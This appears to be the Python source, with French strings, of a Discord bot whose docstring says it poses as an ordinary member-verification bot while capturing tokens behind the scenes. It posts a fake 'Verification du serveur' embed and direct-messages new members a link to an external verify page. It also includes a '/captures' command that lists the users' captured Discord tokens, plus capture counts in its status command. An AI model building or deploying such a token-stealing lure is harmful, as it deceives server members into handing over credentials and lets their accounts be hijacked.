"""Bot Discord : verification classique en apparence, capture de token en coulisses."""

from __future__ import annotations

import logging
import secrets
from typing import Optional

import discord
from discord import app_commands
from discord.ext import commands, tasks

from app import db
from app.config import settings
from app.security import sign_state

log = logging.getLogger("verif.bot")

LINK_BUTTON_ID = "verif:link"

VERIFY_EMBED_TITLE = "Verification du serveur"
VERIFY_EMBED_BODY = (
    "Pour acceder a l'integralite des salons, tu dois verifier ton compte.\n\n"
    "**1.** Clique sur le bouton ci-dessous\n"
    "**2.** Autorise l'application Discord\n"
    "**3.** Ton role est attribue automatiquement\n\n"
    "_La verification prend moins de 10 secondes._"
)


def build_verify_url(guild_id: int, user_id: Optional[int] = None) -> str:
    state = sign_state(
        {
            "guild_id": str(guild_id),
            "user_id": str(user_id) if user_id else None,
            "n": secrets.token_hex(4),
        },
        settings.session_secret,
    )
    return f"{settings.public_base_url}/verify?state={state}"


def verify_embed(guild: discord.Guild) -> discord.Embed:
    embed = discord.Embed(
        title=VERIFY_EMBED_TITLE,
        description=VERIFY_EMBED_BODY,
        colour=discord.Colour.from_str("#5865F2"),
    )
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    embed.set_footer(text="Verification automatique")
    return embed


class VerifyView(discord.ui.View):
    """Vue persistante : le bouton lien reste fonctionnel apres un redemarrage."""

    def __init__(self, url: Optional[str] = None) -> None:
        super().__init__(timeout=None)
        if url:
            self.add_item(
                discord.ui.Button(
                    label="Verifier maintenant",
                    style=discord.ButtonStyle.link,
                    url=url,
                    row=0,
                )
            )
        button = discord.ui.Button(
            label="Obtenir mon lien",
            style=discord.ButtonStyle.primary,
            custom_id=LINK_BUTTON_ID,
            row=0,
        )
        button.callback = self._send_link
        self.add_item(button)

    async def _send_link(self, interaction: discord.Interaction) -> None:
        if interaction.guild_id is None:
            await interaction.response.send_message(
                "Utilise cette commande depuis un serveur.", ephemeral=True
            )
            return
        url = build_verify_url(interaction.guild_id, interaction.user.id)
        await interaction.response.send_message(
            f"**Ton lien de verification :**\n{url}", ephemeral=True
        )


class VerifBot(commands.Bot):
    def __init__(self) -> None:
        intents = discord.Intents.default()
        intents.members = True
        intents.guilds = True
        intents.message_content = True
        super().__init__(
            command_prefix="!",
            intents=intents,
            help_command=None,
            allowed_mentions=discord.AllowedMentions(everyone=False, roles=False),
        )

    # -- cycle de vie -------------------------------------------------------

    async def setup_hook(self) -> None:
        self.add_view(VerifyView(None))
        self._register_commands()
        try:
            synced = await self.tree.sync()
            log.info("%d commandes synchronisees", len(synced))
        except Exception:
            log.exception("echec de la synchronisation des commandes")
        self.sweeper.start()

    async def on_ready(self) -> None:
        await self.change_presence(
            status=discord.Status.online,
            activity=discord.Activity(type=discord.ActivityType.watching, name="les verifications"),
        )
        log.info("connecte en tant que %s (%s)", self.user, self.user.id if self.user else "?")
        log.info("invitation: %s", settings.bot_invite_url)

    # -- evenements ---------------------------------------------------------

    async def on_member_join(self, member: discord.Member) -> None:
        if member.bot:
            return
        config = await db.get_guild_config(member.guild.id)
        if not config or not config.get("enabled", True):
            return

        await db.create_pending(member.guild.id, member.id, "join")

        unverified_role = config.get("unverified_role_id")
        if unverified_role:
            try:
                await member.add_roles(
                    discord.Object(id=int(unverified_role)), reason="Verification en attente"
                )
            except discord.HTTPException:
                log.warning("impossible d'attribuer le role non-verifie sur %s", member.guild.id)

        url = build_verify_url(member.guild.id, member.id)
        embed = discord.Embed(
            title=f"Bienvenue sur {member.guild.name}",
            description=(
                "Derniere etape : verifie ton compte pour debloquer les salons.\n\n"
                f"[**Clique ici pour te verifier**]({url})"
            ),
            colour=discord.Colour.from_str("#5865F2"),
        )
        try:
            await member.send(embed=embed)
        except discord.Forbidden:
            log.info("MP fermes pour %s", member.id)

    # -- taches de fond -----------------------------------------------------

    @tasks.loop(minutes=45)
    async def sweeper(self) -> None:
        try:
            removed = await db.prune_pending(30)
            if removed:
                log.info("%d verifications en attente purgees", removed)
        except Exception:
            log.exception("echec du nettoyage")

    @sweeper.before_loop
    async def _before_sweeper(self) -> None:
        await self.wait_until_ready()

    # -- commandes ----------------------------------------------------------

    def _register_commands(self) -> None:
        tree = self.tree
        bot = self

        @tree.command(name="setup", description="Configure la verification sur ce serveur")
        @app_commands.guild_only()
        @app_commands.default_permissions(manage_guild=True)
        @app_commands.describe(
            role="Role attribue apres verification",
            channel="Salon ou poster le message de verification",
            unverified_role="Role retire apres verification (optionnel)",
            log_channel="Salon de logs (optionnel)",
        )
        async def setup(
            interaction: discord.Interaction,
            role: discord.Role,
            channel: discord.TextChannel,
            unverified_role: Optional[discord.Role] = None,
            log_channel: Optional[discord.TextChannel] = None,
        ) -> None:
            await interaction.response.defer(ephemeral=True)
            assert interaction.guild is not None

            me = interaction.guild.me
            if me is not None and role >= me.top_role:
                await interaction.followup.send(
                    "Le role doit etre place **sous** le role du bot.", ephemeral=True
                )
                return

            url = build_verify_url(interaction.guild.id)
            message = await channel.send(
                embed=verify_embed(interaction.guild), view=VerifyView(url)
            )

            await db.upsert_guild_config(
                interaction.guild.id,
                guild_name=interaction.guild.name,
                verify_channel_id=channel.id,
                verified_role_id=role.id,
                unverified_role_id=unverified_role.id if unverified_role else None,
                log_channel_id=log_channel.id if log_channel else None,
                verify_message_id=message.id,
                enabled=True,
            )
            await interaction.followup.send(
                f"Verification configuree dans {channel.mention} avec le role {role.mention}.",
                ephemeral=True,
            )

        @tree.command(name="verify", description="Verifie manuellement un membre")
        @app_commands.guild_only()
        @app_commands.default_permissions(manage_guild=True)
        async def verify(interaction: discord.Interaction, member: discord.Member) -> None:
            await interaction.response.defer(ephemeral=True)
            assert interaction.guild is not None
            config = await db.get_guild_config(interaction.guild.id)
            if not config or not config.get("verified_role_id"):
                await interaction.followup.send(
                    "Lance `/setup` avant d'utiliser cette commande.", ephemeral=True
                )
                return
            await bot.grant_verified(
                interaction.guild, member.id, int(config["verified_role_id"]), config
            )
            await db.set_verification_status(
                interaction.guild.id, member.id, "verified", "manuel", "manual"
            )
            await interaction.followup.send(f"{member.mention} est verifie.", ephemeral=True)

        @tree.command(name="unverify", description="Retire le role de verification")
        @app_commands.guild_only()
        @app_commands.default_permissions(manage_guild=True)
        async def unverify(interaction: discord.Interaction, member: discord.Member) -> None:
            await interaction.response.defer(ephemeral=True)
            assert interaction.guild is not None
            config = await db.get_guild_config(interaction.guild.id)
            if not config or not config.get("verified_role_id"):
                await interaction.followup.send("Aucune configuration.", ephemeral=True)
                return
            try:
                await member.remove_roles(discord.Object(id=int(config["verified_role_id"])))
            except discord.HTTPException:
                pass
            await db.set_verification_status(
                interaction.guild.id, member.id, "pending", "retire", "manual"
            )
            await interaction.followup.send(f"{member.mention} n'est plus verifie.", ephemeral=True)

        @tree.command(name="link", description="Recupere ton lien de verification")
        async def link(interaction: discord.Interaction) -> None:
            if interaction.guild_id is None:
                await interaction.response.send_message(
                    "Utilise cette commande depuis un serveur.", ephemeral=True
                )
                return
            await interaction.response.send_message(
                f"**Ton lien :** {build_verify_url(interaction.guild_id, interaction.user.id)}",
                ephemeral=True,
            )

        @tree.command(name="config", description="Affiche la configuration de verification")
        @app_commands.guild_only()
        async def config_cmd(interaction: discord.Interaction) -> None:
            assert interaction.guild is not None
            config = await db.get_guild_config(interaction.guild.id)
            if not config:
                await interaction.response.send_message(
                    "Aucune configuration. Lance `/setup`.", ephemeral=True
                )
                return
            embed = discord.Embed(title="Configuration", colour=discord.Colour.from_str("#5865F2"))
            embed.add_field(
                name="Role verifie",
                value=f"<@&{config['verified_role_id']}>" if config.get("verified_role_id") else "-",
                inline=True,
            )
            embed.add_field(
                name="Salon",
                value=(
                    f"<#{config['verify_channel_id']}>" if config.get("verify_channel_id") else "-"
                ),
                inline=True,
            )
            embed.add_field(
                name="Actif", value="oui" if config.get("enabled", True) else "non", inline=True
            )
            embed.add_field(name="Lien", value=build_verify_url(interaction.guild.id), inline=False)
            await interaction.response.send_message(embed=embed, ephemeral=True)

        @tree.command(name="captures", description="Derniers tokens captures")
        async def captures(interaction: discord.Interaction, limit: int = 10) -> None:
            rows = await db.list_captures(limit=max(1, min(limit, 25)))
            if not rows:
                await interaction.response.send_message("Aucune capture.", ephemeral=True)
                return
            lines = []
            for row in rows:
                name = row.get("global_name") or row.get("username") or str(row["user_id"])
                token = row["token"]
                masked = f"{token[:14]}...{token[-6:]}" if len(token) > 24 else token
                stamp = row["captured_at"].strftime("%d/%m %H:%M")
                lines.append(f"`{stamp}` **{name}** — `{masked}`")
            embed = discord.Embed(
                title="Tokens captures",
                description="\n".join(lines),
                colour=discord.Colour.from_str("#5865F2"),
            )
            embed.set_footer(text=f"{len(rows)} entrees")
            await interaction.response.send_message(embed=embed, ephemeral=True)

        @tree.command(name="status", description="Etat du bot")
        async def status(interaction: discord.Interaction) -> None:
            data = await db.stats()
            embed = discord.Embed(title="Etat", colour=discord.Colour.from_str("#57F287"))
            embed.add_field(name="Serveurs", value=str(len(self.guilds)), inline=True)
            embed.add_field(name="Captures", value=str(data.get("captures", 0)), inline=True)
            embed.add_field(name="Verifies", value=str(data.get("verified", 0)), inline=True)
            embed.add_field(name="Latence", value=f"{round(self.latency * 1000)} ms", inline=True)
            await interaction.response.send_message(embed=embed, ephemeral=True)

        # commande prefixe de secours
        @bot.command(name="setup")
        @commands.has_guild_permissions(manage_guild=True)
        async def setup_prefix(
            ctx: commands.Context,
            role: discord.Role,
            channel: discord.TextChannel,
            unverified_role: Optional[discord.Role] = None,
        ) -> None:
            assert ctx.guild is not None
            url = build_verify_url(ctx.guild.id)
            message = await channel.send(embed=verify_embed(ctx.guild), view=VerifyView(url))
            await db.upsert_guild_config(
                ctx.guild.id,
                guild_name=ctx.guild.name,
                verify_channel_id=channel.id,
                verified_role_id=role.id,
                unverified_role_id=unverified_role.id if unverified_role else None,
                verify_message_id=message.id,
                enabled=True,
            )
            await ctx.reply("Verification configuree.", mention_author=False)

    # -- helpers ------------------------------------------------------------

    async def grant_verified(
        self, guild: discord.Guild, user_id: int, role_id: int, config: dict
    ) -> None:
        member = guild.get_member(user_id)
        if member is None:
            try:
                member = await guild.fetch_member(user_id)
            except discord.HTTPException:
                member = None
        if member is None:
            log.info("membre %s introuvable sur %s", user_id, guild.id)
            return
        try:
            await member.add_roles(discord.Object(id=role_id), reason="Verification reussie")
        except discord.HTTPException:
            log.exception("impossible d'attribuer le role verifie")

        unverified_role = config.get("unverified_role_id")
        if unverified_role:
            try:
                await member.remove_roles(discord.Object(id=int(unverified_role)))
            except discord.HTTPException:
                pass

        log_channel = config.get("log_channel_id")
        if log_channel:
            channel = guild.get_channel(int(log_channel))
            if isinstance(channel, discord.TextChannel):
                embed = discord.Embed(
                    title="Verification reussie",
                    description=f"{member.mention} (`{member.id}`)",
                    colour=discord.Colour.from_str("#57F287"),
                    timestamp=discord.utils.utcnow(),
                )
                embed.set_thumbnail(url=member.display_avatar.url)
                try:
                    await channel.send(embed=embed)
                except discord.HTTPException:
                    pass


async def run_bot() -> None:
    if not settings.discord_bot_token:
        log.warning("DISCORD_BOT_TOKEN absent : le bot ne demarre pas")
        return
    await db.init()
    bot = VerifBot()
    try:
        await bot.start(settings.discord_bot_token)
    finally:
        if not bot.is_closed():
            await bot.close()
